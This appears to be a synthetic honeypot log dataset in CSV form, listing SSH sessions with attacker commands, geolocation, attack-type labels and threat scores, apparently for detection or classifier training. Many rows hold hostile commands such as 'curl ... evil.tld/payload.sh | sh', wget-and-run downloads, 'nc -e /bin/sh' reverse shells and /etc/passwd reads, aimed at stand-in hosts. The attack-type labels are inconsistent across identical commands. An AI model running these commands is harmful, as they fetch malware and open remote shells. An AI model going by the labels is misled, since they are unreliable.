session_id,src_ip,timestamp,username,command,failed_logins,commands_count,has_url,payload_hash,geo_lat,geo_lon,country,attack_type,threat_score
sess_10904,97.151.12.139,2025-10-03T16:25:53.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,48.299338,1.88622,FR,malware_fetch,0.115
sess_10893,38.215.218.199,2025-10-03T16:25:54.746466Z,user,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:8bf15e0a319eb066a764bc63e185a7b0a33e0b56f811ecfb1ec731c34d3d6c45,29.172183,77.740416,IN,malware_fetch,0.615
sess_10798,128.27.43.15,2025-10-03T16:25:55.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,3,2,0,,40.132911,116.844577,CN,malware_fetch,0.135
sess_10860,178.205.67.210,2025-10-03T16:25:55.746466Z,admin,chmod +x /tmp/h; /tmp/h &,2,2,0,,37.199085,-122.128218,US,payload_exec,0.11
sess_10879,14.139.17.166,2025-10-03T16:25:57.746466Z,www-data,grep -R 'password' /var/log || true,0,1,0,,-23.463883,-47.196788,BR,benign,0.03
sess_10845,166.54.118.171,2025-10-03T16:25:59.746466Z,test,chmod +x /tmp/h; /tmp/h &,8,2,0,,53.00305,13.956828,DE,payload_exec,0.26
sess_10844,82.160.50.89,2025-10-03T16:26:02.746466Z,test,nc -e /bin/sh 10.10.10.5 4444,1,1,0,,48.602775,2.853432,FR,reverse_shell,0.055
sess_10872,171.7.98.71,2025-10-03T16:26:02.746466Z,oracle,whoami; pwd; ls -la; find / -maxdepth 2 -type f | head -n 20,2,4,0,,55.398906,37.728467,RU,benign,0.17
sess_10899,178.92.217.39,2025-10-03T16:26:02.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,-23.935078,-46.755441,BR,malware_fetch,0.09
sess_10791,170.83.155.125,2025-10-03T16:26:04.746466Z,admin,ps aux | grep sshd,0,1,0,,51.49344,-0.721692,GB,benign,0.03
sess_10852,100.247.92.225,2025-10-03T16:26:10.746466Z,ubuntu,ps aux | grep sshd; python3 -c 'print(2+2)',0,2,0,,55.418517,38.172803,RU,benign,0.06
sess_10828,179.128.6.32,2025-10-03T16:26:14.746466Z,user,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd; nc -lvp 4444 &,0,3,0,,39.734668,116.572692,CN,recon,0.09
sess_10895,48.102.88.78,2025-10-03T16:26:14.746466Z,admin,curl -s http://evil.tld/payload.sh | sh,5,1,1,sha256:909e2683c47e28c559e9e57724379a16d63803c0000748415491f27c415d0afd,52.934802,13.254109,DE,reverse_shell,0.655
sess_10834,17.54.108.207,2025-10-03T16:26:17.746466Z,ftp,grep -R 'password' /var/log || true; ps aux | grep sshd,0,2,0,,49.171734,2.531254,FR,benign,0.06
sess_10836,215.185.118.117,2025-10-03T16:26:18.746466Z,unknown,ps aux | grep sshd,0,1,0,,35.762049,139.183433,JP,benign,0.03
sess_10855,208.165.133.173,2025-10-03T16:26:19.746466Z,oracle,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,52.241981,13.678824,DE,reverse_shell,0.09
sess_10882,178.8.170.215,2025-10-03T16:26:19.746466Z,unknown,chmod +x /tmp/h; /tmp/h &,5,2,0,,56.284454,37.501108,RU,payload_exec,0.185
sess_10910,81.136.236.154,2025-10-03T16:26:19.746466Z,admin,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,5,3,1,sha256:68a65dcdf6da3dde6118c1cbdf707815a6f8fc96e388f47557918116d912f3d4,38.02934,-122.02703,US,payload_exec,0.715
sess_10843,98.24.218.74,2025-10-03T16:26:22.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:fcb10c9cb4e99095acdae66da8c4a9cca27519563be6f0cfb33c02bbf2ae18a1,28.891082,77.125645,IN,malware_fetch,0.53
sess_10897,43.162.68.103,2025-10-03T16:26:24.746466Z,guest,echo 'hello' > /tmp/x; cat /tmp/x; echo 'hello' > /tmp/x; cat /tmp/x,6,4,0,,36.998776,127.440706,KR,benign,0.27
sess_10906,73.234.20.20,2025-10-03T16:26:24.746466Z,pi,chmod +x /tmp/h; /tmp/h &,2,2,0,,35.547796,140.26802,JP,payload_exec,0.11
sess_10773,23.155.38.68,2025-10-03T16:26:25.746466Z,unknown,whoami; pwd; ls -la; cat /etc/passwd | grep root,0,4,0,,29.048174,77.512642,IN,benign,0.12
sess_10870,131.236.107.240,2025-10-03T16:26:26.746466Z,unknown,cat /etc/passwd | grep root,0,1,0,,37.389971,-122.454808,US,benign,0.03
sess_10894,61.71.66.170,2025-10-03T16:26:27.746466Z,unknown,whoami; pwd; ls -la,1,3,0,,48.45501,1.753212,FR,benign,0.115
sess_10825,206.178.13.233,2025-10-03T16:26:29.746466Z,guest,find / -maxdepth 2 -type f | head -n 20,1,1,0,,52.433059,13.680071,DE,benign,0.055
sess_10898,56.120.188.93,2025-10-03T16:26:31.746466Z,ftp,grep -R 'password' /var/log || true; python3 -c 'print(2+2)',0,2,0,,39.826681,116.214904,CN,benign,0.06
sess_10789,145.89.135.234,2025-10-03T16:26:35.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,-23.526407,-46.821371,BR,reverse_shell,0.215
sess_10884,11.159.140.144,2025-10-03T16:26:36.746466Z,admin,chmod +x /tmp/h; /tmp/h &,0,2,0,,48.362394,2.853813,FR,payload_exec,0.06
sess_10793,85.112.16.122,2025-10-03T16:26:38.746466Z,ubuntu,ps aux | grep sshd; grep -R 'password' /var/log || true,0,2,0,,28.386783,77.285689,IN,benign,0.06
sess_10841,195.23.37.190,2025-10-03T16:26:38.746466Z,postgres,python3 -c 'print(2+2)'; ps aux | grep sshd,2,2,0,,51.775849,-0.02033,GB,benign,0.11
sess_10813,68.148.128.100,2025-10-03T16:26:40.746466Z,admin,grep -R 'password' /var/log || true,4,1,0,,29.132071,77.209056,IN,benign,0.13
sess_10891,97.51.95.234,2025-10-03T16:26:40.746466Z,guest,chmod +x /tmp/h; /tmp/h &,3,2,0,,51.647335,-0.01551,GB,malware_fetch,0.135
sess_10833,83.73.12.84,2025-10-03T16:26:41.746466Z,pi,ps aux | grep sshd; grep -R 'password' /var/log || true,0,2,0,,29.13027,77.703247,IN,benign,0.06
sess_10878,202.5.100.114,2025-10-03T16:26:41.746466Z,ftp,chmod +x /tmp/h; /tmp/h &,0,2,0,,40.403169,116.410752,CN,reverse_shell,0.06
sess_10786,150.131.249.65,2025-10-03T16:26:43.746466Z,postgres,nc -e /bin/sh 10.10.10.5 4444,2,1,0,,36.018932,140.120047,JP,reverse_shell,0.08
sess_10821,67.227.154.242,2025-10-03T16:26:44.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,1,2,0,,50.972197,0.35271,GB,benign,0.085
sess_10877,122.178.91.7,2025-10-03T16:26:44.746466Z,postgres,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,5,2,0,,37.425449,126.592807,KR,benign,0.185
sess_10869,184.138.165.158,2025-10-03T16:26:47.746466Z,user,whoami; pwd; ls -la,5,3,0,,-23.704996,-46.507879,BR,benign,0.215
sess_10812,216.34.224.110,2025-10-03T16:26:49.746466Z,admin,find / -maxdepth 2 -type f | head -n 20,0,1,0,,55.877588,37.414404,RU,recon,0.03
sess_10890,130.165.190.145,2025-10-03T16:26:50.746466Z,www-data,whoami; pwd; ls -la,4,3,0,,37.365401,-122.448805,US,benign,0.19
sess_10857,149.10.10.206,2025-10-03T16:26:51.746466Z,admin,grep -R 'password' /var/log || true; find / -maxdepth 2 -type f | head -n 20,1,2,0,,37.401017,126.616128,KR,benign,0.085
sess_10824,109.253.9.221,2025-10-03T16:26:52.746466Z,oracle,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:f4d26d22d2de6dd4977463ca2ca94e04a9964e5214df6ab085848a65e365bac8,49.049083,1.789767,FR,malware_fetch,0.53
sess_10826,199.29.55.142,2025-10-03T16:26:55.746466Z,unknown,find / -maxdepth 2 -type f | head -n 20; grep -R 'password' /var/log || true,1,2,0,,35.712195,139.286759,JP,benign,0.085
sess_10861,149.77.48.189,2025-10-03T16:26:57.746466Z,ubuntu,find / -maxdepth 2 -type f | head -n 20; ps aux | grep sshd,1,2,0,,51.027015,0.435315,GB,benign,0.085
sess_10863,108.8.254.187,2025-10-03T16:26:58.746466Z,pi,ps aux | grep sshd,3,1,0,,28.550402,77.181168,IN,recon,0.105
sess_10779,101.220.108.39,2025-10-03T16:27:00.746466Z,ftp,nc -e /bin/sh 10.10.10.5 4444,1,1,0,,-24.091539,-46.774273,BR,malware_fetch,0.055
sess_10901,186.232.5.125,2025-10-03T16:27:02.746466Z,oracle,ps aux | grep sshd; python3 -c 'print(2+2)',4,2,0,,51.509874,0.209404,GB,benign,0.16
sess_10907,31.172.154.109,2025-10-03T16:27:02.746466Z,root,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,2,3,0,,37.06164,127.472816,KR,reverse_shell,0.14
sess_10780,119.99.150.49,2025-10-03T16:27:03.746466Z,test,echo 'hello' > /tmp/x; cat /tmp/x; ls -la; id; uname -a; nc -lvp 4444 &,0,6,0,,37.313125,-121.94533,US,benign,0.18
sess_10856,97.23.157.115,2025-10-03T16:27:06.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x,6,2,0,,35.822402,139.246758,JP,recon,0.21
sess_10796,120.238.215.247,2025-10-03T16:27:07.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,5,2,0,,35.996528,139.82995,JP,malware_fetch,0.185
sess_10837,103.247.117.115,2025-10-03T16:27:11.746466Z,ubuntu,grep -R 'password' /var/log || true,2,1,0,,37.765583,127.104655,KR,benign,0.08
sess_10839,127.7.85.31,2025-10-03T16:27:11.746466Z,guest,python3 -c 'print(2+2)'; cat /etc/passwd | grep root; nc -lvp 4444 &,2,3,0,,-22.96258,-47.074447,BR,benign,0.14
sess_10862,158.241.192.75,2025-10-03T16:27:16.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,55.999255,37.625212,RU,payload_exec,0.09
sess_10847,39.61.227.228,2025-10-03T16:27:18.746466Z,postgres,curl -s http://evil.tld/payload.sh | sh,7,1,1,sha256:542ec75ab5f63a4acd019a85c38255a76b008b670d32ea8befecc1f49a323f3e,37.06138,127.329984,KR,reverse_shell,0.705
sess_10768,166.38.215.175,2025-10-03T16:27:19.746466Z,pi,cat /etc/passwd | grep root,6,1,0,,39.809685,115.956311,CN,benign,0.18
sess_10851,173.45.109.1,2025-10-03T16:27:19.746466Z,admin,python3 -c 'print(2+2)'; nc -lvp 4444 &,2,2,0,,51.664632,-0.446141,GB,benign,0.11
sess_10795,150.93.192.201,2025-10-03T16:27:20.746466Z,admin,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,52.775118,13.367055,DE,payload_exec,0.09
sess_10853,204.147.214.249,2025-10-03T16:27:25.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,28.806635,77.026094,IN,malware_fetch,0.09
sess_10809,55.164.55.179,2025-10-03T16:27:27.746466Z,oracle,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,-23.561176,-46.418681,BR,payload_exec,0.24
sess_10776,219.160.159.182,2025-10-03T16:27:29.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,10,2,0,,35.525873,140.261778,JP,malware_fetch,0.31
sess_10790,167.62.221.204,2025-10-03T16:27:29.746466Z,user,whoami; pwd; ls -la; grep -R 'password' /var/log || true,1,4,0,,37.355173,-121.859394,US,benign,0.145
sess_10778,38.56.123.5,2025-10-03T16:27:32.746466Z,test,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,39.446191,116.467765,CN,payload_exec,0.115
sess_10903,168.232.222.13,2025-10-03T16:27:34.746466Z,guest,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",0,3,0,,28.837565,76.911792,IN,reverse_shell,0.09
sess_10767,187.5.168.55,2025-10-03T16:27:35.746466Z,user,echo 'hello' > /tmp/x; cat /tmp/x,1,2,0,,37.090004,126.711658,KR,benign,0.085
sess_10814,113.29.56.150,2025-10-03T16:27:38.746466Z,guest,whoami; pwd; ls -la,3,3,0,,48.423746,2.408705,FR,benign,0.165
sess_10875,24.70.225.109,2025-10-03T16:27:38.746466Z,pi,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:24884b24228a2e4f061a12656616764a514e1f3cf0462d7b08aa1d1a5a5cd3fc,52.489374,13.179114,DE,malware_fetch,0.615
sess_10896,133.81.176.26,2025-10-03T16:27:38.746466Z,ftp,grep -R 'password' /var/log || true,2,1,0,,36.005167,139.20669,JP,benign,0.08
sess_10801,25.62.153.104,2025-10-03T16:27:44.746466Z,test,find / -maxdepth 2 -type f | head -n 20; python3 -c 'print(2+2)',1,2,0,,51.670837,-0.506031,GB,benign,0.085
sess_10854,112.65.247.216,2025-10-03T16:27:47.746466Z,user,curl -s http://evil.tld/payload.sh | sh,0,1,1,sha256:6070867165993dead928a41251960ca68f2c53af41125dcf47e0ab6f842e9fd7,49.195993,1.825164,FR,malware_fetch,0.53
sess_10815,198.168.31.61,2025-10-03T16:27:49.746466Z,admin,whoami; pwd; ls -la,2,3,0,,53.035236,13.870022,DE,benign,0.14
sess_10865,196.119.30.197,2025-10-03T16:27:49.746466Z,guest,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,8,3,0,,52.746797,13.523476,DE,reverse_shell,0.29
sess_10883,181.31.33.50,2025-10-03T16:27:53.746466Z,test,cat /etc/passwd | grep root; nc -lvp 4444 &,2,2,0,,28.505002,77.37136,IN,benign,0.11
sess_10806,107.241.92.148,2025-10-03T16:27:56.746466Z,unknown,cat /etc/passwd | grep root; whoami; pwd; ls -la,2,4,0,,35.574029,139.145615,JP,benign,0.17
sess_10848,197.38.167.41,2025-10-03T16:27:56.746466Z,pi,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,1,3,0,,40.152372,116.185172,CN,payload_exec,0.115
sess_10832,38.39.227.29,2025-10-03T16:27:58.746466Z,admin,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,55.654964,37.787564,RU,payload_exec,0.03
sess_10908,40.98.133.78,2025-10-03T16:28:00.746466Z,ftp,python3 -c 'print(2+2)'; nc -lvp 4444 &,0,2,0,,40.426774,116.137144,CN,benign,0.06
sess_10787,163.247.57.70,2025-10-03T16:28:02.746466Z,unknown,grep -R 'password' /var/log || true,0,1,0,,37.563899,126.671241,KR,benign,0.03
sess_10849,20.221.51.239,2025-10-03T16:28:03.746466Z,pi,chmod +x /tmp/h; /tmp/h &,3,2,0,,-23.011481,-46.480558,BR,payload_exec,0.135
sess_10868,119.253.87.161,2025-10-03T16:28:05.746466Z,postgres,chmod +x /tmp/h; /tmp/h &,0,2,0,,39.826775,116.160468,CN,reverse_shell,0.06
sess_10774,116.228.62.134,2025-10-03T16:28:07.746466Z,ubuntu,grep -R 'password' /var/log || true; whoami; pwd; ls -la,0,4,0,,48.612081,1.851553,FR,benign,0.12
sess_10810,68.103.82.112,2025-10-03T16:28:07.746466Z,unknown,echo 'hello' > /tmp/x; cat /tmp/x,0,2,0,,38.146911,-121.947451,US,benign,0.06
sess_10781,158.136.122.17,2025-10-03T16:28:09.746466Z,admin,chmod +x /tmp/h; /tmp/h &,2,2,0,,51.028965,0.152909,GB,payload_exec,0.11
sess_10888,54.18.197.40,2025-10-03T16:28:12.746466Z,user,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,0,3,0,,40.259726,116.056336,CN,reverse_shell,0.09
sess_10797,88.124.191.33,2025-10-03T16:28:15.746466Z,user,find / -maxdepth 2 -type f | head -n 20,0,1,0,,37.935477,127.427893,KR,benign,0.03
sess_10802,220.123.87.131,2025-10-03T16:28:16.746466Z,ubuntu,whoami; pwd; ls -la; ls -la; id; uname -a,0,6,0,,55.618785,37.977126,RU,benign,0.18
sess_10866,12.137.107.194,2025-10-03T16:28:24.746466Z,unknown,whoami; pwd; ls -la; python3 -c 'print(2+2)',1,4,0,,36.119883,140.283006,JP,benign,0.145
sess_10805,178.77.180.168,2025-10-03T16:28:25.746466Z,pi,whoami; pwd; ls -la,0,3,0,,53.019392,13.579161,DE,benign,0.09
sess_10769,54.167.196.61,2025-10-03T16:28:32.746466Z,root,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,6,3,0,,-23.809261,-46.223329,BR,payload_exec,0.24
sess_10829,153.111.209.15,2025-10-03T16:28:33.746466Z,admin,chmod +x /tmp/h; /tmp/h &,5,2,0,,-23.934735,-46.314128,BR,payload_exec,0.185
sess_10752,217.81.216.88,2025-10-03T16:50:45.746466Z,oracle,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,60,3,1,sha256:1dd95732ff695ab2bf8be8c0b426ecf2dd67124b3ea28ee12a3bb2bc1bb9e9e8,56.135848,38.001341,RU,malware_fetch,1.0
sess_10747,82.79.110.246,2025-10-03T16:54:02.746466Z,guest,python3 -c 'print(2+2)',36,1,0,,37.388575,127.371823,KR,benign,0.93
sess_10713,217.81.216.88,2025-10-03T16:56:10.746466Z,ubuntu,whoami; pwd; ls -la,53,3,0,,28.475593,77.670069,IN,benign,1.0
sess_10697,125.142.3.195,2025-10-03T17:03:51.746466Z,www-data,whoami; pwd; ls -la,37,3,0,,37.188308,127.515994,KR,benign,1.0
sess_10741,213.220.242.55,2025-10-03T17:04:23.746466Z,ubuntu,whoami; pwd; ls -la; python3 -c 'print(2+2)',1,4,0,,51.265404,0.126848,GB,recon,0.145
sess_10729,82.79.110.246,2025-10-03T17:12:50.746466Z,user,ls -la; id; uname -a; whoami; pwd; ls -la,32,6,0,,-23.248485,-46.082813,BR,recon,0.98
sess_10755,77.81.165.53,2025-10-03T17:15:04.746466Z,admin,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,8,3,1,sha256:d1e017bff7d842d9f56b02b368906843e2bf9d200e10e1c00ab74a64cde8867d,52.572407,13.97188,DE,payload_exec,0.79
sess_10714,39.251.86.254,2025-10-03T17:19:41.746466Z,ubuntu,nc -e /bin/sh 10.10.10.5 4444,0,1,0,,48.689192,2.861843,FR,reverse_shell,0.03
sess_10698,82.79.110.246,2025-10-03T17:20:04.746466Z,admin,whoami; pwd; ls -la,59,3,0,,40.010893,116.533057,CN,benign,1.0
sess_10748,82.79.110.246,2025-10-03T17:20:34.746466Z,test,cat /etc/passwd | grep root; echo 'hello' > /tmp/x; cat /tmp/x,52,3,0,,40.130461,116.332392,CN,benign,1.0
sess_10730,91.200.182.250,2025-10-03T17:24:59.746466Z,unknown,ps aux | grep sshd; python3 -c 'print(2+2)',0,2,0,,37.879511,-122.560866,US,benign,0.06
sess_10721,210.71.150.118,2025-10-03T17:28:58.746466Z,ftp,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20; nc -lvp 4444 &,6,3,0,,51.752155,-0.274847,GB,recon,0.24
sess_10740,206.172.52.24,2025-10-03T17:29:21.746466Z,www-data,chmod +x /tmp/h; /tmp/h &,48,2,0,,38.103947,-122.94452,US,malware_fetch,1.0
sess_10717,99.135.22.187,2025-10-03T17:29:38.746466Z,pi,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",60,3,0,,37.909155,126.952118,KR,payload_exec,1.0
sess_10733,72.106.38.246,2025-10-03T17:31:13.746466Z,user,ls -la; id; uname -a; ls -la; id; uname -a,4,6,0,,28.97076,77.683162,IN,benign,0.28
sess_10732,99.135.22.187,2025-10-03T17:33:35.746466Z,ftp,ps aux | grep sshd; cat /etc/passwd | grep root,37,2,0,,55.203815,37.872615,RU,benign,0.985
sess_10760,217.81.216.88,2025-10-03T17:38:42.746466Z,guest,curl -s http://evil.tld/payload.sh | sh,46,1,1,sha256:fb9c776d52ae5cdfd3573eb50e7fd760d9c554e1cea925bbc8fb9d007a2692ef,38.200671,-122.878751,US,payload_exec,1.0
sess_10766,101.203.15.30,2025-10-03T17:38:44.746466Z,unknown,whoami; pwd; ls -la,0,3,0,,36.024917,139.238464,JP,benign,0.09
sess_10746,99.135.22.187,2025-10-03T17:40:51.746466Z,oracle,echo 'hello' > /tmp/x; cat /tmp/x,22,2,0,,36.255593,139.783904,JP,benign,0.61
sess_10739,206.172.52.24,2025-10-03T17:44:05.746466Z,oracle,whoami; pwd; ls -la; echo 'hello' > /tmp/x; cat /tmp/x,17,5,0,,-23.81645,-47.187361,BR,benign,0.575
sess_10764,161.159.84.204,2025-10-03T17:45:49.746466Z,unknown,ps aux | grep sshd; python3 -c 'print(2+2)',2,2,0,,48.771776,2.43277,FR,benign,0.11
sess_10699,82.79.110.246,2025-10-03T17:46:58.746466Z,user,cat /etc/passwd | grep root,47,1,0,,-22.988504,-46.17245,BR,recon,1.0
sess_10704,127.132.155.219,2025-10-03T17:49:46.746466Z,guest,cat /etc/passwd | grep root; nc -lvp 4444 &,0,2,0,,48.434367,2.812523,FR,benign,0.06
sess_10735,206.172.52.24,2025-10-03T17:59:31.746466Z,unknown,grep -R 'password' /var/log || true,33,1,0,,52.950804,13.286127,DE,benign,0.855
sess_10758,217.81.216.88,2025-10-03T18:06:44.746466Z,guest,ls -la; id; uname -a,23,3,0,,39.77316,116.396644,CN,benign,0.665
sess_10750,36.227.16.171,2025-10-03T18:08:46.746466Z,oracle,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",5,3,0,,37.738389,-122.870071,US,payload_exec,0.215
sess_10709,197.92.144.6,2025-10-03T18:14:18.746466Z,test,python3 -c 'print(2+2)'; cat /etc/passwd | grep root,1,2,0,,-23.376357,-46.750295,BR,benign,0.085
sess_10734,206.172.52.24,2025-10-03T18:15:16.746466Z,test,ls -la; id; uname -a,14,3,0,,48.471624,2.678529,FR,benign,0.44
sess_10754,197.88.206.232,2025-10-03T18:16:29.746466Z,ftp,curl -s http://evil.tld/payload.sh | sh,7,1,1,sha256:86a875ab08722b52a1039dedab0bc98cfefbebe472660a5346ddd85f8c9c04ef,48.94892,2.222615,FR,malware_fetch,0.705
sess_10724,99.135.22.187,2025-10-03T18:21:43.746466Z,postgres,whoami; pwd; ls -la,12,3,0,,48.981608,1.960496,FR,benign,0.39
sess_10720,218.112.44.61,2025-10-03T18:28:23.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,1,3,1,sha256:695233730e08af0a2406b8fb6779ab58a69060c576125730e41065cf2becac4d,37.246393,-122.600183,US,reverse_shell,0.615
sess_10762,205.78.110.222,2025-10-03T18:29:15.746466Z,admin,whoami; pwd; ls -la,5,3,0,,55.476909,37.59519,RU,benign,0.215
sess_10722,206.172.52.24,2025-10-03T18:31:06.746466Z,root,ps aux | grep sshd,19,1,0,,55.594093,37.112092,RU,benign,0.505
sess_10751,129.211.202.2,2025-10-03T18:31:55.746466Z,unknown,nc -e /bin/sh 10.10.10.5 4444,4,1,0,,51.913581,0.226366,GB,reverse_shell,0.13
sess_10710,46.6.51.97,2025-10-03T18:34:28.746466Z,root,wget http://malicious.example/malware -O /tmp/m; chmod +x /tmp/m; /tmp/m,10,3,1,sha256:77514bb34b50ac2e86dd5431dcd2b3bacc1f16f64a1dce80d52894ccadba90fb,37.496088,-121.893082,US,payload_exec,0.84
sess_10706,217.81.216.88,2025-10-03T18:41:07.746466Z,user,python3 -c 'print(2+2)'; nc -lvp 4444 &,56,2,0,,36.247773,139.303782,JP,benign,1.0
sess_10718,108.49.183.217,2025-10-03T18:46:20.746466Z,unknown,whoami; pwd; ls -la,32,3,0,,39.687379,116.315998,CN,benign,0.89
sess_10761,82.79.110.246,2025-10-03T19:01:45.746466Z,user,cat /etc/passwd | grep root,22,1,0,,51.634733,-0.084655,GB,benign,0.58
sess_10759,125.142.3.195,2025-10-03T19:02:28.746466Z,www-data,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,34,3,0,,-23.082844,-46.473038,BR,reverse_shell,0.94
sess_10703,30.84.224.193,2025-10-03T19:08:41.746466Z,oracle,ps aux | grep sshd; whoami; pwd; ls -la,0,4,0,,28.849966,77.663986,IN,benign,0.12
sess_10736,185.66.225.94,2025-10-03T19:09:33.746466Z,user,ls -la; id; uname -a; ps aux | grep sshd,6,4,0,,35.140711,140.264618,JP,benign,0.27
sess_10726,125.142.3.195,2025-10-03T19:12:01.746466Z,oracle,python3 -c 'print(2+2)',35,1,0,,35.309933,139.986895,JP,recon,0.905
sess_10728,18.122.144.42,2025-10-03T19:17:30.746466Z,admin,chmod +x /tmp/h; /tmp/h &,3,2,0,,39.96623,116.573467,CN,malware_fetch,0.135
sess_10712,125.142.3.195,2025-10-03T19:18:02.746466Z,unknown,ls -la; id; uname -a; nc -lvp 4444 &,16,4,0,,55.769651,38.02108,RU,benign,0.52
sess_10700,60.228.50.20,2025-10-03T19:18:52.746466Z,user,grep -R 'password' /var/log || true; cat /etc/passwd | grep root,0,2,0,,37.835495,-122.716369,US,recon,0.06
sess_10753,96.87.220.62,2025-10-03T19:21:22.746466Z,oracle,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,3,3,0,,28.707324,76.763645,IN,reverse_shell,0.165
sess_10715,125.142.3.195,2025-10-03T19:34:41.746466Z,test,chmod +x /tmp/h; /tmp/h &,48,2,0,,52.137639,13.315293,DE,reverse_shell,1.0
sess_10701,154.177.187.115,2025-10-03T19:41:36.746466Z,unknown,"python -c 'import socket; s=socket.socket(); s.connect((""1.2.3.4"",4444))'",1,3,0,,52.050333,0.221262,GB,malware_fetch,0.115
sess_10756,17.66.232.163,2025-10-03T19:42:03.746466Z,unknown,python3 -c 'print(2+2)',3,1,0,,35.961075,140.060217,JP,benign,0.105
sess_10727,30.239.244.81,2025-10-03T19:47:50.746466Z,www-data,cat /etc/passwd | grep root; find / -maxdepth 2 -type f | head -n 20,0,2,0,,37.05987,127.101828,KR,benign,0.06
sess_10707,148.54.195.243,2025-10-03T19:48:09.746466Z,guest,find / -maxdepth 2 -type f | head -n 20,1,1,0,,37.93578,127.281477,KR,benign,0.055
sess_10719,116.170.70.206,2025-10-03T19:48:11.746466Z,ubuntu,echo 'hello' > /tmp/x; cat /tmp/x; ps aux | grep sshd,0,3,0,,-23.292595,-46.600965,BR,benign,0.09
sess_10757,82.79.110.246,2025-10-03T19:49:38.746466Z,root,python3 -c 'print(2+2)',16,1,0,,37.099618,127.490639,KR,benign,0.43
sess_10744,154.101.39.186,2025-10-03T19:52:00.746466Z,user,python3 -c 'print(2+2)'; find / -maxdepth 2 -type f | head -n 20,2,2,0,,48.273624,2.828001,FR,benign,0.11
sess_10738,206.172.52.24,2025-10-03T19:52:20.746466Z,admin,python3 -c 'print(2+2)'; grep -R 'password' /var/log || true,56,2,0,,39.434218,116.958858,CN,recon,1.0
sess_10745,138.162.58.203,2025-10-03T19:53:38.746466Z,oracle,grep -R 'password' /var/log || true,2,1,0,,52.6867,13.499052,DE,benign,0.08
sess_10731,20.148.82.39,2025-10-03T19:55:57.746466Z,postgres,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,10,3,0,,51.166177,0.089952,GB,malware_fetch,0.34
sess_10743,108.49.183.217,2025-10-03T19:57:42.746466Z,unknown,echo 'payload' > /tmp/x; chmod +x /tmp/x; /tmp/x,32,3,0,,29.109017,77.29338,IN,reverse_shell,0.89
